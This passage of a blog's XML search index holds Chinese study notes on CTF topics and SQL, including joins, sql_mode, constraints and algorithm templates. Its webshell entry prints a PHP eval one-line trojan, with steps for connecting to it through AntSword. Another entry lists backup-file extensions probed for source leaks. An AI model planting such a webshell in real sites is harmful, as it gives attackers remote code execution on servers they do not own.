      <link href="/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/"/>
      <url>/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/</url>
      
        <content type="html"><![CDATA[<h1 id="常见网站源码备份文件后缀"><a href="#常见网站源码备份文件后缀" class="headerlink" title="常见网站源码备份文件后缀"></a>常见网站源码备份文件后缀</h1><ol><li>“.git” 、“.svn”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”、“.zip”</li><li>也可以是：</li><li><img src="https://img2020.cnblogs.com/blog/2556426/202201/2556426-20220118162112250-42073699.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 网站备份漏洞 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
            <tag> 网站备份漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webshell</title>
      <link href="/webshell/"/>
      <url>/webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><ol><li>webshell是以asp,php,jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理，服务器管理，权限管理等操作。<h2 id="webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。"><a href="#webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。" class="headerlink" title="webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。"></a>webshell是一种通过上传脚本就可以管理网站和服务器的环境，很方便。但如果不注意安全控制，也会方便了黑客入侵。</h2><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1></li><li><?php @eval($POST['value']);?></li><li>其中eval函数将括号内的代码通过php语言执行，而括号内就是通过post方式传递一个名为value的表单，加上@后忽略了服务器的报错</li></ol><h1 id="用蚁剑链接webshell"><a href="#用蚁剑链接webshell" class="headerlink" title="用蚁剑链接webshell"></a>用蚁剑链接webshell</h1><ol><li>右击添加数据</li><li>给出url和密码</li><li><img src="https://img-blog.csdnimg.cn/b30d18e590d3438ca8276d7869bc557e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20yYTMxODE=,size_16,color_FFFFFF,t_70"></li><li>如果连接不上记得将默认字符集修改为base64等</li></ol>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
          <category> CTF </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>火狐浏览器禁止js</title>
      <link href="/%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A6%81%E7%94%A8js/"/>
      <url>/%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A6%81%E7%94%A8js/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><ol><li>火狐浏览器搜索about:config</li></ol><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><ol><li>跳转之后选择接受风险并继续</li></ol><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><ol><li>在搜索框中搜索javascript</li></ol><h1 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h1><ol><li>将JavaScript enabled更换为false</li></ol>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子sql注入</title>
      <link href="/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/"/>
      <url>/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="不同的字符编码也会导致出现一些安全问题"><a href="#不同的字符编码也会导致出现一些安全问题" class="headerlink" title="不同的字符编码也会导致出现一些安全问题"></a>不同的字符编码也会导致出现一些安全问题</h2><h3 id="sql语法中用单引号”‘“作为转义字符"><a href="#sql语法中用单引号”‘“作为转义字符" class="headerlink" title="sql语法中用单引号”‘“作为转义字符"></a>sql语法中用单引号”‘“作为转义字符</h3><ol><li>insert into person(LastName) values(‘O’’R’)</li><li>则输出结果为O’R</li></ol><h3 id="php中的转义为"><a href="#php中的转义为" class="headerlink" title="php中的转义为\"></a>php中的转义为\</h3><h2 id="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"><a href="#如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节" class="headerlink" title="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"></a>如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节</h2><ol><li>0x 5c和0x bf 5c会被认为是一个字符（双字节字符）</li></ol><h2 id="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"><a href="#要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异" class="headerlink" title="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"></a>要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异</h2><ol><li>统一设置为utf-8是一个很好的办法</li></ol><h1 id="mysql中环境变量sql-mode"><a href="#mysql中环境变量sql-mode" class="headerlink" title="mysql中环境变量sql_mode"></a>mysql中环境变量sql_mode</h1><ol><li>定义了mysql应该支持的sql语法，数据校验等</li><li>默认为null，这种设置下可以允许一些非法操作，比如允许一些非法数据的插入</li><li>在生产环境下必须设置为严格模式<h2 id="sql-mode常用来解决的几类问题"><a href="#sql-mode常用来解决的几类问题" class="headerlink" title="sql_mode常用来解决的几类问题"></a>sql_mode常用来解决的几类问题</h2></li><li>通过设置sql_mode，可以完成不同严格程度的数据校验，有效地保证数据准确性；</li><li>通过设置sql_mode为宽松模式，来保证大多数sql符合标准的sql语法，这样应用在不同数据库之间进行迁移时。则不需要对业务sql进行较大的修改；</li><li>在不同数据库之间进行数据迁移之前，通过设置sql_mode可以使MySQL上的数据更方便地迁移到目标数据库中<h2 id="sql-mode包含的模式"><a href="#sql-mode包含的模式" class="headerlink" title="sql_mode包含的模式"></a>sql_mode包含的模式</h2></li><li>ansi模式：宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，爆warning警告</li><li>traditional模式：严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，爆error错误</li><li>strict_trans_tables模式：严格模式，进行数据的严格校验，错误数据不能插入，爆error错误</li></ol><h3 id="查看sql-mode的语句："><a href="#查看sql-mode的语句：" class="headerlink" title="查看sql_mode的语句："></a>查看sql_mode的语句：</h3><ol><li><p>use database_name;</p></li><li><p>select @@sql_mode;</p></li><li><p>或者</p></li><li><p>use data_basename;</p></li><li><p>show variables like ‘%sql_mode%’;</p></li><li><p><a href="https://imgtu.com/i/LmrvjS"><img src="https://s1.ax1x.com/2022/04/12/LmrvjS.png" alt="LmrvjS.png"></a></p></li><li><p>结论：在STRICT_TRANS_TABLES模式下，插入数据时，mysql会严格的进行数据的校验，当发现插入列值未满足要求，直接报告error错误，保证了错误数据无法插入到数据库中</p></li><li><p>结论：</p></li><li><p>严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误，而不仅仅是警告。用于事务时，会进行事务的回滚。</p></li><li><p>一旦发现错误立即放弃INSERT/UPDATE。如果你使用非事务存储引擎，这种方式不是你想要的，因为出现错误前进行的数据更改不会“滚动”，结果是更新“只进行了一部分”。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql查询</title>
      <link href="/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/"/>
      <url>/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>from字句后面的表名，可以用表原名，也可以为它起别名，一旦有了别名，整个查询语句中凡是涉及用表名的地方都要用表原名</li><li>查询语句中出现的所有列，若在所有涉及的表中是唯一的，则列明前可以不加表明前缀</li><li>如果不是唯一的，为了确定它的唯一性，<strong>必须在列名前加表名前缀</strong></li></ol><h2 id="等值连接和非等值连接"><a href="#等值连接和非等值连接" class="headerlink" title="等值连接和非等值连接"></a>等值连接和非等值连接</h2><ol><li>两个表进行连接时，必须要有可比字段，两个可比字段的值进行逐一比较来决定当前两个元组是否可以连接</li><li>等值连接不会去重<pre class="line-numbers language-none"><code class="language-none">select student.*,SC.*from student,SCwhere student.sno &#x3D; SC.sno;select SC.sno,SC.score,SG.gradefrom SC,SGwhere SC.score BETWEEN SG.minscore AND SG.maxscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><h3 id="显示内连接"><a href="#显示内连接" class="headerlink" title="显示内连接"></a>显示内连接</h3><ol><li>on来连接两个连接列，where中写连接条件</li><li>显示内连接用inner join</li><li>内连接又叫自然连接，会去掉重复列的等值连接<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 inner join 表2on 表1.连接列&#x3D;表2.连接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="隐式内连接"><a href="#隐式内连接" class="headerlink" title="隐式内连接"></a>隐式内连接</h3><ol><li>where写连接列，and后跟条件</li><li>隐式内连接用’=’<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1，表2where 表1.连接字段&#x3D;表2.连接字段and 其它查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><h3 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h3><ol><li>以左边的表为基础，根据ON后面给出的两表的条件将两表连接起来</li><li>结果会将左表所有查询信息列出，右表只会列出ON后条件和左表满足的部分</li><li>语句left join… on<pre class="line-numbers language-none"><code class="language-none">select a.device_id,question_id,result,level,gender,agefrom(    select device_id,question_id,result,level    from question_practice_detail)a-表别名left join(    select device_id,gender,age    from user_profile)b-表别名on a.device_id&#x3D;b.device_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/14/MH8AP7neVJtcExF.png"><h3 id="左外连接的注意事项"><a href="#左外连接的注意事项" class="headerlink" title="左外连接的注意事项"></a>左外连接的注意事项</h3></li><li>在使用left join时，写在前面的表为匹配时的底表，使用on给出匹配条件，<strong>匹配条件可以不唯一</strong></li><li>在表匹配时，一般我们会将要匹配的两段查询用括号括起来，并在<strong>括号末尾给予一串字母</strong>，作为表的别名</li></ol><h4 id="左外连接例题"><a href="#左外连接例题" class="headerlink" title="左外连接例题"></a>左外连接例题</h4><pre class="line-numbers language-none"><code class="language-none">select    university,    difficult_level,    round(count(qpd.question_id) &#x2F; count(distinct qpd.device_id),4) as avg_answer_cnt-- round(x,4)将x四舍五入至小数点后四位    from question_practice_detail as qpdleft join user_profile as upon up.device_id&#x3D;qpd.device_idleft join question_detail as qdon qd.question_id&#x3D;qpd.question_idgroup by university,difficult_level;-- group by university按学校分组，group by difficult_level按不同难度的用户平均答题量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/14/H3ScumMxIbJQnBT.png"><br><img src="https://s2.loli.net/2022/05/14/2gbWteK8NRLpX3Y.png"></p><h3 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h3><ol><li>左外连接的反向连接<pre class="line-numbers language-none"><code class="language-none">Select a.device_id,question_id,result,level,gender,agefrom(Select device_id,gender,ageFrom user_profile)a -- 表别名Right join(Select device_id,question_id,result,levelFrom question_practice_detail)b -- 表别名On a.device_id &#x3D; b.device_id —给出链接条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全外连接"><a href="#全外连接" class="headerlink" title="全外连接"></a>全外连接</h3></li><li>将左右两个表先左外连接，在右外连接，然后两个结果并在一起<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 full join 表2on 表1.链接列&#x3D;表2.链接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="自身链接"><a href="#自身链接" class="headerlink" title="自身链接"></a>自身链接</h3><ol><li>链接操作不仅可以在多个表之间进行链接，而且可以时一个表与其自身进行连接，这样的表称为自身连接</li><li>因为两个表的表名和列名都相同，为了加以区分，必须给他们起两个别名，且各列前<strong>必须要有****表别名前缀</strong><pre class="line-numbers language-none"><code class="language-none">select FIRST.cno,SECOND.cpnofrom course FIRST inner join course SECONDon FIRST.cpno &#x3D; SECOND.cno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><ol><li>在写表和表的连接关系时，大多数情况下都必须要限制匹配条件，如果在匹配时没有限制匹配条件，这时就会导致笛卡尔积。</li><li>笛卡尔积时关系代数里一个概念，表示两个表中的每一行数据任意组合</li><li>假设A中有n行数据，b中有m行数据，没有限制匹配条件的话，最终输出的结果就会有n*m行数据</li><li>在互联网大体量数据情况下，每个表 可能有几百万几千万行数据，几千万*几千万最终得到的结果行数会是天文数字，所以在写匹配时，一定不要忘了加上匹配条件。</li></ol><h1 id="全称量词命题和存在量词命题"><a href="#全称量词命题和存在量词命题" class="headerlink" title="全称量词命题和存在量词命题"></a>全称量词命题和存在量词命题</h1><p><img src="https://s2.loli.net/2022/05/15/C8n7jA3FNu4BTcI.png"><br><img src="https://s2.loli.net/2022/05/15/jnP8qkXrQzlxcJ7.png"></p><h1 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h1><h2 id="嵌套查询的工作方式"><a href="#嵌套查询的工作方式" class="headerlink" title="嵌套查询的工作方式"></a>嵌套查询的工作方式</h2><ol><li>先处理内查询，由内向外处理</li><li>外层查询利用内层查询的结果<br><img src="https://s2.loli.net/2022/05/15/GIv4x7RsuibCVPM.png"><pre class="line-numbers language-none"><code class="language-none">select tag,count(tag) as tag_cntfrom exam_recordjoin examination_info on exam_record.exam_id &#x3D; examination_info.exam_idwhere uid in (    select uid    from exam_record    where submit_time is not null    group by score    having count(exam_id) &#x2F; count(distinct DATE_FORMAT(start_time,&quot;%Y%m&quot;)) &gt;&#x3D; 3)group by tagorder by tag_cnt desc;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/b49OdtZRJVKMaox.png"><br><img src="https://s2.loli.net/2022/05/15/1pJmxVgWicM7wB2.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数二分</title>
      <link href="/%E4%BA%8C%E5%88%86%E5%88%A4%E6%96%AD%E5%89%8D%E5%90%8E%E8%BE%B9%E7%95%8C/"/>
      <url>/%E4%BA%8C%E5%88%86%E5%88%A4%E6%96%AD%E5%89%8D%E5%90%8E%E8%BE%B9%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="整数二分步骤"><a href="#整数二分步骤" class="headerlink" title="整数二分步骤"></a>整数二分步骤</h1><ol><li>找一个区间l,r，使得答案一定在该区间中</li><li>找一个判断条件，使得该判断条件具有二段性，并且答案一定是在该二段性的分界点</li><li>分析终点M在该判断条件下是否成立，如果成立，考虑答案在哪个区间，如果不成立，考虑答案在哪个区间（答案一定落在M上））</li><li>如果更新方式是￥R=mid 则不用做任何处理，如果L=mid,则需要在计算mid时+1</li><li>我的想法：L=mid，终点落在L上，则判断为左边界</li><li>R=mid，终点落在R上，则判断为右边界</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dfs深度优先遍历模板</title>
      <link href="/dfs%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86%E6%A8%A1%E6%9D%BF/"/>
      <url>/dfs%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="dfs模板"><a href="#dfs模板" class="headerlink" title="dfs模板"></a>dfs模板</h1><pre><code>    void dfs()&#123;//参数用来表示状态        if(到达终点状态)&#123;        //根据题意任意添加        return;    &#125;    if(越界或不合法状态)&#123;        return;    &#125;    if(特殊状态)&#123;//剪枝        return;    &#125;    for(拓展方式)&#123;        if(拓展方式所到达状态合法)&#123;            修改操作;           标记;            dfs(更深层的递归)            还原标记;          //是否还原根据题意         //如果加上（还原标记）则是回溯法        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf图片合成问题</title>
      <link href="/%E5%9B%BE%E7%89%87%E5%90%88%E6%88%90%E9%97%AE%E9%A2%98/"/>
      <url>/%E5%9B%BE%E7%89%87%E5%90%88%E6%88%90%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="图片合成问题"><a href="#图片合成问题" class="headerlink" title="图片合成问题"></a>图片合成问题</h1><h2 id="攻防世界what-is-this"><a href="#攻防世界what-is-this" class="headerlink" title="攻防世界what_is_this"></a>攻防世界what_is_this</h2><ol><li>给出两张相像的图片</li><li>使用stegsolve中的image combiner</li><li><a href="https://imgtu.com/i/qOwZaF"><img src="https://s1.ax1x.com/2022/04/05/qOwZaF.png" alt="qOwZaF.png"></a></li><li><a href="https://imgtu.com/i/qOwe54"><img src="https://s1.ax1x.com/2022/04/05/qOwe54.png" alt="qOwe54.png"></a></li><li>其实也可以使用comapre去比较</li><li>compare pic1.jpg pic2.jpg -compose src diff.png</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>w3school手册</title>
      <link href="/w3school%E5%9C%B0%E5%9D%80/"/>
      <url>/w3school%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="w3school手册地址"><a href="#w3school手册地址" class="headerlink" title="w3school手册地址"></a>w3school手册地址</h1><ol><li><a href="https://www.w3school.com.cn/sql/index.asp">https://www.w3school.com.cn/sql/index.asp</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> w3school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> w3school </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>insert插入操作</title>
      <link href="/insert%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/"/>
      <url>/insert%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li><p>INSERT和VALUES之间不能有分号</p></li><li><p>最后一个参数的后面不能用逗号隔开</p><pre><code> INSERT INTO actor(     actor_id,     first_name,     last_name,     last_update ) VALUES(1,&#39;PENELOPE&#39;,&#39;GUINESS&#39;,&#39;2006-02-15 12:34:33&#39;),     (2,&#39;NICK&#39;,&#39;WAHLBERG&#39;,&#39;2006-02-15 12:34:33&#39;);</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql语句中change和modify的区别</title>
      <link href="/sql%E8%AF%AD%E5%8F%A5%E4%B8%ADchange%E5%92%8Cmodify%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/sql%E8%AF%AD%E5%8F%A5%E4%B8%ADchange%E5%92%8Cmodify%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h1><ol><li>都可以修改表的定义</li></ol><h1 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h1><ol><li>change后面需要写两次列名，但是可以修改列的名称</li><li>modify只需要写一次列明，但是不能修改列的名称</li></ol><h1 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h1><ol><li>ALTER TABLE table.name MODIFY column.name COLUMN_DEFINATION</li><li>alter table test1 modify ename varchar(20);</li><li>上面的是将test1表中的ename字段定义，将varchar(10)改为varchar(20)<h2 id="字段改名："><a href="#字段改名：" class="headerlink" title="字段改名："></a>字段改名：</h2></li><li>ALTER TABLE tablename CHANGE[COLUMN] old_column_name column_defination</li><li>将ename改为enmaeq,同时修改字段类型int(3)为int(4)</li><li>alter table test1 change ename ename1 int(4);</li><li>两次列的名字分别为改前和改后的</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中的NUMBER数据类型</title>
      <link href="/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="NUMBER"><a href="#NUMBER" class="headerlink" title="NUMBER"></a>NUMBER</h1><ol><li>可以存储零值，正负数，定长数</li></ol><h2 id="表示范围和存储空间"><a href="#表示范围和存储空间" class="headerlink" title="表示范围和存储空间"></a>表示范围和存储空间</h2><ol><li>从从1.0 x 10-130 到 1.0 x 10126(不包括)，如果表达式或值大于1.0 x 10126，Oracle会返回错误信息</li></ol><h2 id="NUMBER类型表示方法"><a href="#NUMBER类型表示方法" class="headerlink" title="NUMBER类型表示方法"></a>NUMBER类型表示方法</h2><ol><li>number(p,s) p和s可选</li><li>其中p表示数字的总长度，s表示可以有几位小数</li><li>precision叫精度，数中总数字的个数，默认为38位</li><li>scale是小数位数，即数中小数点右边的数字个数</li></ol><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li>number数据类型只存在于Oracle中，不存在于MySQL中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中表级别的约束和列级别的约束</title>
      <link href="/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/"/>
      <url>/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="sql中表级别的约束和列级别的约束"><a href="#sql中表级别的约束和列级别的约束" class="headerlink" title="sql中表级别的约束和列级别的约束"></a>sql中表级别的约束和列级别的约束</h1><h2 id="列级别的约束有六种："><a href="#列级别的约束有六种：" class="headerlink" title="列级别的约束有六种："></a>列级别的约束有六种：</h2><ol><li>primary key</li><li>foreign key</li><li>unique</li><li>check</li><li>default</li><li>not null/null</li></ol><h1 id="表级别的约束"><a href="#表级别的约束" class="headerlink" title="表级别的约束"></a>表级别的约束</h1><ol><li>主键</li><li>外键</li><li>唯一</li><li>检查</li></ol><h1 id="列约束的定义"><a href="#列约束的定义" class="headerlink" title="列约束的定义"></a>列约束的定义</h1><ol><li><p>直接跟在该列的其他定义之后，用空格分割，不必指定列名</p></li><li><p>表约束和列定义相互独立，不包括在列定义中，通常用于对多个列一起进行约束，与列定义用“，”分割，定义表约束时必须指出要约束的哪些列的名称，完整性约束的基本语法格式时[CONSTANT &lt;约束名&gt;] &lt;约束类型&gt;</p><pre><code> CREATE TABLE g1 &#123;     g_id CHAR(6) PRIMARY KEY     g_name VARCHAR(20) &#125;</code></pre><p>或</p><pre><code> CREATE TABLE stu &#123;     s_id CHAR(10)     CONSTRAINT pk PRIMARY KEY(s_id) &#125;</code></pre></li></ol><h1 id="完整性概念"><a href="#完整性概念" class="headerlink" title="完整性概念"></a>完整性概念</h1><h2 id="域完整性"><a href="#域完整性" class="headerlink" title="域完整性"></a>域完整性</h2><ol><li>域完整性是对数据表中字段属性的约束<h2 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h2></li><li>通过主键约束和候选键约束实现<h2 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h2></li><li>MySQL中的外键</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql常见的建表选项和约束</title>
      <link href="/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/"/>
      <url>/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="create-table选项"><a href="#create-table选项" class="headerlink" title="create table选项"></a>create table选项</h1><h2 id="指定列选项：default"><a href="#指定列选项：default" class="headerlink" title="指定列选项：default"></a>指定列选项：default</h2><ol><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值 ；如果没有，则为null。</li><li>sex char(1) default ‘m’</li><li>当然，也可以在INSERT和UPDATE语句中使用DEFAULT关键字显式地给列赋默认值：</li><li>函数default(column)可以得到一个列的默认值：select default(sex) from people;</li></ol><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><ol><li>用来给列加注释，最多255个字符，注释会保存到数据字典中</li><li>id int not null primary key</li><li><pre><code>comment &#39;学号&#39;</code></pre><h3 id="从数据字典中查询注释信息"><a href="#从数据字典中查询注释信息" class="headerlink" title="从数据字典中查询注释信息"></a>从数据字典中查询注释信息</h3></li><li>select column_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="在CREATE-TABLES语句中的表选项"><a href="#在CREATE-TABLES语句中的表选项" class="headerlink" title="在CREATE TABLES语句中的表选项"></a>在CREATE TABLES语句中的表选项</h1><h2 id="engine-指定表使用的存储引擎"><a href="#engine-指定表使用的存储引擎" class="headerlink" title="engine:指定表使用的存储引擎"></a>engine:指定表使用的存储引擎</h2><ol><li>存储引擎：决定了数据如何存储以及如何访问，还有事务如何处理</li><li>show engines 用来查询所有支持的存储引擎</li></ol><h1 id="CREATE-TABLE约束"><a href="#CREATE-TABLE约束" class="headerlink" title="CREATE TABLE约束"></a>CREATE TABLE约束</h1><h2 id="作用：可以为列定义约束"><a href="#作用：可以为列定义约束" class="headerlink" title="作用：可以为列定义约束"></a>作用：可以为列定义约束</h2><ol><li>约束主要是防止非法数据进入表中，保证数据的正确性和一致性，统称为数据完整性</li><li>约束也可以防止一个表被删除</li></ol><h2 id="MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息"><a href="#MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息" class="headerlink" title="MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息"></a>MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息</h2><h2 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" 